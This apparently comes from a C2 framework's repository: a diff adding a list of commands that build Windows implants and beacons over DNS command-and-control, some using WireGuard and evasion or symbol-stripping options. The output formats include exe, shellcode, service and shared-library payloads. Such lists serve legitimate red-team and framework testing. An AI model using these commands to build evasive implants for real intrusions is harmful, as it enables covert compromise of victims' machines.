@@ -1,0 +1,31 @@
+# DNS 
+
+generate --dns blog.microsoft.com --os windows --arch 386 -f exe -s dns__386.exe
+generate --dns blog.microsoft.com --os windows --arch amd64 -f exe -s dns__amd64.exe
+generate --dns blog.microsoft.com --os windows --arch 386 -f shellcode -s dns__386.shellcode
+generate --dns blog.microsoft.com --os windows --arch amd64 -f shellcode -s dns__amd64.shellcode
+generate --dns blog.microsoft.com --os windows --arch 386 -f service -s dns__386.service
+generate --dns blog.microsoft.com --os windows --arch amd64 -f service -s dns__amd64.service
+generate --dns blog.microsoft.com --os windows --arch 386 -f shared -s dns__386.shared
+generate --dns blog.microsoft.com --os windows --arch amd64 -f shared -s dns__amd64.shared
+generate --dns blog.microsoft.com -e --os windows --arch 386 -f exe -s dns__evasion_386.exe
+generate --dns blog.microsoft.com -e --os windows --arch amd64 -f service -s dns__evasion_amd64.service
+generate --dns blog.microsoft.com -e --os windows --arch amd64 -f shared -s dns__evasion_amd64.shared
+generate --dns blog.microsoft.com --skip-symbols --os windows --arch 386 -f exe -s dns__skip_386.exe
+generate --dns blog.microsoft.com --skip-symbols --os windows --arch amd64 -f service -s dns__skip_amd64.service
+generate --dns blog.microsoft.com --skip-symbols --os windows --arch amd64 -f exe -s dns__skip_amd64.exe
+generate --dns blog.microsoft.com --skip-symbols -e --os windows --arch 386 -f service -s dns__skip_evasion_386.service
+generate --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f exe -s dns__skip_evasion_amd64.exe
+generate --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f shared -s dns__skip_evasion_amd64.shared
+generate beacon --dns blog.microsoft.com --os windows --arch 386 -f shared -s beacon_dns__386.shared
+generate beacon --dns blog.microsoft.com -e --os windows --arch 386 -f exe -s beacon_dns__evasion_386.exe
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com --os windows --arch 386 -f service -s beacon_wg_dns__386.service
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com -e --os windows --arch 386 -f exe -s beacon_wg_dns__evasion_386.exe
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com -e --os windows --arch amd64 -f exe -s beacon_wg_dns__evasion_amd64.exe
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com -e --os windows --arch amd64 -f shared -s beacon_wg_dns__evasion_amd64.shared
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com --skip-symbols --os windows --arch 386 -f shellcode -s beacon_wg_dns__skip_386.shellcode
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com --skip-symbols --os windows --arch amd64 -f shared -s beacon_wg_dns__skip_amd64.shared
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch 386 -f shared -s beacon_wg_dns__skip_evasion_386.shared
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f exe -s beacon_wg_dns__skip_evasion_amd64.exe
+generate beacon --wg 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f shared -s beacon_wg_dns__skip_evasion_amd64.shared
+
